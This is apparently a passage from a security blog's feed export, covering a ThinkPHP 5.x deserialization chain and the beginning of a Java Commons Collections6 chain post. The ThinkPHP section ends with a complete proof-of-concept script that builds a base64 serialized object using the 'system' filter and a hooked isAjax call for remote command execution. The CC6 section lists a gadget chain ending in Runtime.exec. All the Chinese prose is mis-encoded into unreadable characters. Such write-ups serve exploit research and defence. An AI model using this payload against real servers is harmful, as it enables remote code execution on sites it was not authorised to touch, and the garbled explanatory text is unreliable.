class="line">                    <span class="comment">// è¿½åŠ å…³è”å¯¹è±¡å±æ€§</span></span><br><span class="line">                    <span class="variable">$relation</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRelation</span>(<span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (!<span class="variable">$relation</span>) &#123;</span><br><span class="line">                        <span class="variable">$relation</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">                        <span class="keyword">if</span> (<span class="variable">$relation</span>) &#123;</span><br><span class="line">                            <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">visible</span>(<span class="variable">$name</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$relation</span> ? <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$name</span>)-&gt;<span class="title function_ invoke__">toArray</span>() : [];</span><br><span class="line">                &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$name</span>, <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">list</span>(<span class="variable">$key</span>, <span class="variable">$attr</span>) = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$name</span>);</span><br><span class="line">                    <span class="comment">// è¿½åŠ å…³è”å¯¹è±¡å±æ€§</span></span><br><span class="line">                    <span class="variable">$relation</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRelation</span>(<span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (!<span class="variable">$relation</span>) &#123;</span><br><span class="line">                        <span class="variable">$relation</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">                        <span class="keyword">if</span> (<span class="variable">$relation</span>) &#123;</span><br><span class="line">                            <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">visible</span>([<span class="variable">$attr</span>]);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡ŒæŒ‰ç…§ä¹‹å‰ 5.0 çš„å†™æ³•çœ‹ï¼Œè¿™é‡Œçš„å‡ ä¸ªå‚æ•°éƒ½æ˜¯å¯æ§çš„<br> <code>getRelation</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getRelation</span>(<span class="params"><span class="variable">$name</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$name</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;relation;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$name</span>, <span class="variable">$this</span>-&gt;relation)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;relation[<span class="variable">$name</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬æ˜¯å¯ä»¥è¿”å›ç©º<br>å¹¶ä¸” <code>append</code>  æ˜¯å¯æ§çš„</p><p><code>getAttr</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAttr</span>(<span class="params"><span class="variable">$name</span>, &amp;<span class="variable">$item</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="variable">$notFound</span> = <span class="literal">false</span>;</span><br><span class="line">            <span class="variable">$value</span>    = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getData</span>(<span class="variable">$name</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (<span class="built_in">InvalidArgumentException</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">            <span class="variable">$notFound</span> = <span class="literal">true</span>;</span><br><span class="line">            <span class="variable">$value</span>    = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/b16fd37204ff41b1a70e4090d9b49cbe.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿™é‡Œé€šè¿‡ <code>data[]</code>  è¿”å›åç»­åˆ©ç”¨ç±»çš„å¯¹è±¡ (Request)</p><p>åœ¨ 5.0 ä¸­æˆ‘ä»¬è¯´è¿™é‡Œçš„å‡ ä¸ªè°ƒç”¨æ–¹æ³•å¯ä»¥è§¦å‘ <code>__call</code>  æ–¹æ³•<br>è¿™é‡Œæˆ‘ä»¬é€‰æ‹©åˆ™ <code>visible</code>  æ¥è§¦å‘ <code>__call</code> <br> æ‰¾ä¸‹å¯ä»¥åˆ©ç”¨çš„æ–¹æ³•<br>åœ¨ <code>Request</code>  ä¸­</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$method</span>, <span class="variable">$this</span>-&gt;hook)) &#123;</span><br><span class="line">            <span class="title function_ invoke__">array_unshift</span>(<span class="variable">$args</span>, <span class="variable">$this</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">call_user_func_array</span>(<span class="variable">$this</span>-&gt;hook[<span class="variable">$method</span>], <span class="variable">$args</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;method not exists:&#x27;</span> . <span class="built_in">static</span>::<span class="variable language_">class</span> . <span class="string">&#x27;-&gt;&#x27;</span> . <span class="variable">$method</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆä¼šåˆ¤æ–­æ–¹æ³•ä¸­æœ‰æ²¡æœ‰è®¾ç½® <code>hook</code> ï¼Œç„¶åæŠŠ <code>this</code>  å…³é”®å­—æ”¾åœ¨ä¹‹æ‰§è¡Œå‚æ•°çš„å‰é¢ï¼Œæ‰€ä»¥è¿™é‡Œå¯¹äºæ–¹æ³•æ˜¯ä¸å¯æ§çš„<br>æ‰€ä»¥åœ¨è¯¥ç±»ä¸‹å¯»æ‰¾å¯ä»¥åç»­åˆ©ç”¨çš„æ–¹æ³•</p><p><code>isAjax</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isAjax</span>(<span class="params"><span class="variable">$ajax</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$value</span>  = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">server</span>(<span class="string">&#x27;HTTP_X_REQUESTED_WITH&#x27;</span>);</span><br><span class="line">        <span class="variable">$result</span> = <span class="string">&#x27;xmlhttprequest&#x27;</span> == <span class="title function_ invoke__">strtolower</span>(<span class="variable">$value</span>) ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">true</span> === <span class="variable">$ajax</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$result</span>           = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">param</span>(<span class="variable">$this</span>-&gt;config[<span class="string">&#x27;var_ajax&#x27;</span>]) ? <span class="literal">true</span> : <span class="variable">$result</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;mergeParam = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„é…ç½®ä¿¡æ¯æ˜¯å¯æ§çš„</p><p><img src="https://img-blog.csdnimg.cn/1079e48ea5b94e07b0abddc40deeb246.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ¥ç€è·Ÿè¿› <code>param</code></p><p><code>param</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">param</span>(<span class="params"><span class="variable">$name</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$default</span> = <span class="literal">null</span>, <span class="variable">$filter</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;mergeParam) &#123;</span><br><span class="line">            <span class="variable">$method</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">method</span>(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// è‡ªåŠ¨è·å–è¯·æ±‚å˜é‡</span></span><br><span class="line">            <span class="keyword">switch</span> (<span class="variable">$method</span>) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">                    <span class="variable">$vars</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">post</span>(<span class="literal">false</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;PUT&#x27;</span>:</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;DELETE&#x27;</span>:</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;PATCH&#x27;</span>:</span><br><span class="line">                    <span class="variable">$vars</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">put</span>(<span class="literal">false</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    <span class="variable">$vars</span> = [];</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// å½“å‰è¯·æ±‚å‚æ•°å’ŒURLåœ°å€ä¸­çš„å‚æ•°åˆå¹¶</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;param = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$this</span>-&gt;param, <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="literal">false</span>), <span class="variable">$vars</span>, <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">route</span>(<span class="literal">false</span>));</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;mergeParam = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">true</span> === <span class="variable">$name</span>) &#123;</span><br><span class="line">            <span class="comment">// è·å–åŒ…å«æ–‡ä»¶ä¸Šä¼ ä¿¡æ¯çš„æ•°ç»„</span></span><br><span class="line">            <span class="variable">$file</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">file</span>();</span><br><span class="line">            <span class="variable">$data</span> = <span class="title function_ invoke__">is_array</span>(<span class="variable">$file</span>) ? <span class="title function_ invoke__">array_merge</span>(<span class="variable">$this</span>-&gt;param, <span class="variable">$file</span>) : <span class="variable language_">$this</span>-&gt;param;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">input</span>(<span class="variable">$data</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$default</span>, <span class="variable">$filter</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">input</span>(<span class="variable">$this</span>-&gt;param, <span class="variable">$name</span>, <span class="variable">$default</span>, <span class="variable">$filter</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>input</code>  ä¸‹ <code>array_walk_recursive</code>  å‚æ•°éƒ½æ˜¯å¯æ§çš„<br><img src="https://img-blog.csdnimg.cn/df777937e1ff4b9c8bd8746b5cc7c549.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä¸‹é¢å°±å¯ä»¥æ„é€ äº†<br>è¿™é‡Œ <code>Conversion</code>  å’Œ <code>Attribute</code>  éƒ½æ˜¯ trait å…³é”®å­—ï¼Œä¸èƒ½ç›´æ¥å®ä¾‹åŒ–<br>éœ€è¦å»æ‰¾ç»§æ‰¿ç±»ï¼Œè¦æ˜¯ç”¨ use å…³é”®å­—ï¼Œå¹¶ä¸”åŒæ—¶ç»§æ‰¿äº† <code>Conversion</code>  å’Œ <code>Attribute</code></p><p><code>Model</code>  ç±»</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span> <span class="keyword">implements</span> \<span class="title">JsonSerializable</span>, \<span class="title">ArrayAccess</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Attribute</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">RelationShip</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">ModelEvent</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">TimeStamp</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯ <code>Model</code>  æ˜¯æŠ½è±¡ç±»ï¼Œè¿˜æ˜¯ä¸èƒ½ç›´æ¥å®ä¾‹åŒ–<br>éœ€è¦æ‰¾åˆ°å…¶æŠ½è±¡çš„å­ç±» <code>Pivot</code></p><p>poc:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$hook</span> = [];</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filter</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$config</span> = [</span><br><span class="line">        <span class="comment">// è¡¨å•è¯·æ±‚ç±»å‹ä¼ªè£…å˜é‡</span></span><br><span class="line">        <span class="string">&#x27;var_method&#x27;</span>       =&gt; <span class="string">&#x27;_method&#x27;</span>,</span><br><span class="line">        <span class="comment">// è¡¨å•ajaxä¼ªè£…å˜é‡</span></span><br><span class="line">        <span class="string">&#x27;var_ajax&#x27;</span>         =&gt; <span class="string">&#x27;_ajax&#x27;</span>,</span><br><span class="line">        <span class="comment">// è¡¨å•pjaxä¼ªè£…å˜é‡</span></span><br><span class="line">        <span class="string">&#x27;var_pjax&#x27;</span>         =&gt; <span class="string">&#x27;_pjax&#x27;</span>,</span><br><span class="line">        <span class="comment">// PATHINFOå˜é‡å ç”¨äºå…¼å®¹æ¨¡å¼</span></span><br><span class="line">        <span class="string">&#x27;var_pathinfo&#x27;</span>     =&gt; <span class="string">&#x27;s&#x27;</span>,</span><br><span class="line">        <span class="comment">// å…¼å®¹PATH_INFOè·å–</span></span><br><span class="line">        <span class="string">&#x27;pathinfo_fetch&#x27;</span>   =&gt; [<span class="string">&#x27;ORIG_PATH_INFO&#x27;</span>, <span class="string">&#x27;REDIRECT_PATH_INFO&#x27;</span>, <span class="string">&#x27;REDIRECT_URL&#x27;</span>],</span><br><span class="line">        <span class="comment">// é»˜è®¤å…¨å±€è¿‡æ»¤æ–¹æ³• ç”¨é€—å·åˆ†éš”å¤šä¸ª</span></span><br><span class="line">        <span class="string">&#x27;default_filter&#x27;</span>   =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="comment">// åŸŸåæ ¹ï¼Œå¦‚thinkphp.cn</span></span><br><span class="line">        <span class="string">&#x27;url_domain_root&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="comment">// HTTPSä»£ç†æ ‡è¯†</span></span><br><span class="line">        <span class="string">&#x27;https_agent_name&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="comment">// IPä»£ç†è·å–æ ‡è¯†</span></span><br><span class="line">        <span class="string">&#x27;http_agent_ip&#x27;</span>    =&gt; <span class="string">&#x27;HTTP_X_REAL_IP&#x27;</span>,</span><br><span class="line">        <span class="comment">// URLä¼ªé™æ€åç¼€</span></span><br><span class="line">        <span class="string">&#x27;url_html_suffix&#x27;</span>  =&gt; <span class="string">&#x27;html&#x27;</span>,</span><br><span class="line">    ];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filter = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;config = [<span class="string">&quot;var_ajax&quot;</span>=&gt;<span class="string">&#x27;huha&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hook = [<span class="string">&quot;visible&quot;</span>=&gt;[<span class="variable language_">$this</span>,<span class="string">&quot;isAjax&quot;</span>]];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$append</span> = [];</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment"># appendé”®å¿…é¡»å­˜åœ¨ï¼Œå¹¶ä¸”ä¸$this-&gt;dataç›¸åŒ</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;append = [<span class="string">&quot;huha&quot;</span>=&gt;[]];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = [<span class="string">&quot;huha&quot;</span>=&gt;<span class="keyword">new</span> <span class="title class_">Request</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files=[<span class="keyword">new</span> <span class="title class_">Pivot</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//var_dump(new Windows());</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Windows</span>()));</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#å‰è¨€&quot;&gt;#&lt;/a&gt; å‰è¨€&lt;/h2&gt;
&lt;p&gt;æ•´ä¸ªæµç¨‹ç†è§£ä¸Šå¯èƒ½ä¸æ˜¯å¾ˆå¤æ‚ï¼Œä½†æˆ‘æ„Ÿè§‰æƒ³æŠŠæ•´ä¸ª exp å†™ä¸‹æ¥è¿˜æ˜¯æœ‰ç‚¹å¤æ‚çš„ï¼Œä¸­é—´ debug çš„è¿‡ç¨‹è¿˜æ˜¯éœ€è¦èŠ±æ—¶é—´å»è€ƒç©¶çš„ã€‚&lt;/p&gt;
&lt;h2</summary>
      
    
    
    
    
    <category term="ä»£ç å®¡è®¡" scheme="https://ki10moc.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="thinkphpæ¡†æ¶" scheme="https://ki10moc.github.io/tags/thinkphp%E6%A1%86%E6%9E%B6/"/>
    
  </entry>
  
  <entry>
    <title>Commons Collections6</title>
    <link href="https://ki10moc.github.io/2023/01/04/Commons%20Collections6(%E6%B0%B4%E7%89%88)/"/>
    <id>https://ki10moc.github.io/2023/01/04/Commons%20Collections6(%E6%B0%B4%E7%89%88)/</id>
    <published>2023-01-03T16:49:36.000Z</published>
    <updated>2023-08-22T20:04:46.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a class="markdownIt-Anchor" href="#å‰è¨€">#</a> å‰è¨€</h2><p>Java 8u71 ä»¥åï¼Œsun.reflect.annotation.AnnotationInvocationHandler#readObject çš„é€»è¾‘å‘ç”Ÿå˜åŒ–ï¼Œå¯¼è‡´ cc1 çš„é“¾å­åœ¨ 8u71 ä¹‹åæ— æ³•ä½¿ç”¨ã€‚<br>æ‰€ä»¥ cc6 å°±æ˜¯è§£å†³é«˜ç‰ˆæœ¬çš„åˆ©ç”¨é—®é¢˜ï¼Œä¾ç„¶æ˜¯ä»ä¸Šä¸‹æ–‡å¯¹ <code>LazyMap#get</code>  çš„è°ƒç”¨</p><h2 id="è°ƒç”¨é“¾"><a class="markdownIt-Anchor" href="#è°ƒç”¨é“¾">#</a> è°ƒç”¨é“¾</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">java.io.ObjectInputStream.readObject()</span><br><span class="line">            java.util.HashSet.readObject()</span><br><span class="line">                java.util.HashMap.put()</span><br><span class="line">                java.util.HashMap.hash()</span><br><span class="line">                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span><br><span class="line">                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span><br><span class="line">                        org.apache.commons.collections.map.LazyMap.get()</span><br><span class="line">                            org.apache.commons.collections.functors.ChainedTransformer.transform()</span><br><span class="line">                            org.apache.commons.collections.functors.InvokerTransformer.transform()</span><br><span class="line">                            java.lang.reflect.Method.invoke()</span><br><span class="line">                                java.lang.Runtime.exec()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åœ¨ <code>TiedMapEntry</code>  çš„ <code>hashcode()</code>  ä¸‹è°ƒç”¨ <code>getkey()</code>  çš„ <code>getvalue()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> getValue();</span><br><span class="line">        <span class="keyword">return</span> (getKey() == <span class="literal">null</span> ? <span class="number">0</span> : getKey().hashCode()) ^</span><br><span class="line">               (value == <span class="literal">null</span> ? <span class="number">0</span> : value.hashCode()); </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> map.get(key);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„ <code>key</code>  å¦‚æœä¼ å…¥ <code>LazyMap</code> ï¼Œå°±å›åˆ°äº† CC1ï¼Œåé¢çš„å°±éƒ½ä¸€æ ·äº†<br>è¿™é‡Œå…¶å®ç†è§£äº† CC5+URLDNS å°±å¯ä»¥è§£å†³ CC6 çš„æµç¨‹</p><p>ä»åŸä½œè€…çš„æµç¨‹ä¸­å¯ä»¥çœ‹åˆ°é“¾å­çš„å…¥å£å°±æ˜¯åœ¨ <code>hashMap</code>  å¤„<br>æ‰€ä»¥å‰é¢çš„æµç¨‹å°±æ˜¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 